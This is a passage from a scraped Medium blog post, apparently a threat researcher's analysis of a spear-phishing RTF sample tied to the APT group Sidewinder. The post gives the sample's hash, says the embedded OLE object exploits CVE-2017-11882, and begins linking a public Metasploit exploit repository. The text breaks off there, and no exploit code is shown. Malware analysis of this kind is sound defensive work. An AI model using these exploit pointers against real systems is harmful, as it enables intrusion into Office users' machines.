12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""/></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" rel="noopener follow"><div class="bg b bh ab eb fr fs ac r ft fu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="ea m">Write</div></div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><div class="bg b bh ab eb fr fs ac r ft fu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div><div class="fv i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="m" aria-hidden="false"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><button class="ak fw ao ac r aq fr fx fy fz" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="ga by m bz ca gb o ak gc"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width:0px"></div><div class="cd bi ce cf cg ch" style="width:calc(100% - 0px)"><div class="m"><div class="gd ge gf gg gh m"><div class="ac ci"><div class="cp bi gi gj gk gl"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="gb gr gs gt gu gv"></div><div class="gw gx gy gz ha"><div class="ac ci"><div class="cp bi gi gj gk gl"><div><h1 id="b4a6" class="pw-post-title hb hc hd bg he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id bl" data-testid="storyTitle">APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading</h1><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac ie if ig ih ii ij ik il im in io"><div class="ac r io"><div class="ac ip"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><a rel="noopener follow" href="/?source=post_page---byline--5bc1a7e7c84c---------------------------------------" data-discover="true"><div class="m iq ir by is it"><div class="m fr"><img alt="Sebdraven" class="m fk by bz ca de" src="https://miro.medium.com/v2/resize:fill:64:64/1*ycwwStTvoVxriAE2No5ipQ.jpeg" width="32" height="32" loading="lazy" data-testid="authorPhoto"/><div class="iu by m bz ca gb o iv gc"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="iw ac r"><div class="ac r ix"><div class="ac r"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at iy" data-testid="authorName" rel="noopener follow" href="/?source=post_page---byline--5bc1a7e7c84c---------------------------------------" data-discover="true">Sebdraven</a></span></div></div></div></div><div class="iz bn"></div></div></div></span></div><div class="ac r ja"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">7 min read</span><div class="jb jc m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">Jul 16, 2018</span></div></span></div></div><div class="ac cw jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js"><div class="i l x fp fq r"><div class="ki m"><div class="ac r kj kk"><div class="pw-multi-vote-icon fr kl km kn ko"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---header_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><div class="kp aq kq kr ks kt ao ku kv kw ko" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m kx ky kz la lb lc ld"><p class="bg b ec ab eb"><span class="le">--</span></p></div></div></div><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><button class="aq kp lf lg ac r fs lh li" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lj"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ac r jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh"><div class="lk l k j e"></div><div class="i l"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=---header_actions--5bc1a7e7c84c---------------------bookmark_footer------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ll" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div></div><div class="fk lm cu"><div class="m ag"><div class="ac ci"><div class="ln lo lp lq lr ls cp bi"><div class="ac"><div class="bn" aria-hidden="false" role="tooltip"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an lt ap aq ar fe lu lv li lw lx ly lz ma t mb mc md me mf mg mh v mi mj mk"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></div></div></div></div></div></div><div class="bn" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an lt ap aq ar fe lu lv li lw lx ly lz ma t mb mc md me mf mg mh v mi mj mk"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><h2 id="73e7" class="ml mm hd bg mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni bl"><span class="m nj nk nl bp nm nn no np nq fr">S</span>pear phishing</h2><p id="a25c" class="pw-post-body-paragraph nr ns hd nt b nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo gw bl">I’ve started few days ago an analysis on a RTF following my recent researches.</p><p id="4ce6" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">I found it this: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488</p><p id="9ab8" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">I execute rtfobj on it and two ole embedded objects malforfed:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov ow"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*clv0SwElLXu5uycgGlttAA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*clv0SwElLXu5uycgGlttAA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*clv0SwElLXu5uycgGlttAA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*clv0SwElLXu5uycgGlttAA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*clv0SwElLXu5uycgGlttAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*clv0SwElLXu5uycgGlttAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*clv0SwElLXu5uycgGlttAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*clv0SwElLXu5uycgGlttAA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*clv0SwElLXu5uycgGlttAA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*clv0SwElLXu5uycgGlttAA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*clv0SwElLXu5uycgGlttAA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*clv0SwElLXu5uycgGlttAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*clv0SwElLXu5uycgGlttAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*clv0SwElLXu5uycgGlttAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="131" loading="eager" role="presentation"/></picture></div></div></figure><p id="e410" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">But rtfobj extracts succeffully two raws objects:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov pp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RoH4AT4fAqfiiy4hO3C8DA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*RoH4AT4fAqfiiy4hO3C8DA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*RoH4AT4fAqfiiy4hO3C8DA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*RoH4AT4fAqfiiy4hO3C8DA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*RoH4AT4fAqfiiy4hO3C8DA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*RoH4AT4fAqfiiy4hO3C8DA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*RoH4AT4fAqfiiy4hO3C8DA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*RoH4AT4fAqfiiy4hO3C8DA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="36" loading="lazy" role="presentation"/></picture></div></div></figure><p id="6ef7" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The object 6A2A1 is very interesting:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov pq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jg292b2dNzrsJddVxaqeuQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*jg292b2dNzrsJddVxaqeuQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jg292b2dNzrsJddVxaqeuQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jg292b2dNzrsJddVxaqeuQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jg292b2dNzrsJddVxaqeuQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jg292b2dNzrsJddVxaqeuQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jg292b2dNzrsJddVxaqeuQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*jg292b2dNzrsJddVxaqeuQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="297" loading="lazy" role="presentation"/></picture></div></div></figure><p id="bc36" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">and this one:</p><figure class="ox oy oz pa pb pc ou ov paragraph-image"><div role="button" tabindex="0" class="pd pe fr pf bi pg"><span class="gb ph pi ao pj pk pl pm pn speechify-ignore">Press enter or click to view image in full size</span><div class="ou ov pr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*irGqF14uiBKgitbGYHGjNg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*irGqF14uiBKgitbGYHGjNg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*irGqF14uiBKgitbGYHGjNg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*irGqF14uiBKgitbGYHGjNg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*irGqF14uiBKgitbGYHGjNg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*irGqF14uiBKgitbGYHGjNg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*irGqF14uiBKgitbGYHGjNg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*irGqF14uiBKgitbGYHGjNg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bi ls po c" width="700" height="128" loading="lazy" role="presentation"/></picture></div></div></figure><p id="2cc5" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">In fact, the ole object is a exploit of CVE-2017–11882.</p><p id="c509" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The implementation is a bit different than my last article, there is not an object MTF.</p><p id="6fe4" class="pw-post-body-paragraph nr ns hd nt b nu op nw nx ny oq oa ob oc or oe of og os oi oj ok ot om on oo gw bl">The implementation has many matching with the public exploit: <a class="ah ps" href="https://github.com/0x09AL/CVE-2017-11882-metasploit" rel="noopener ugc nofollow" 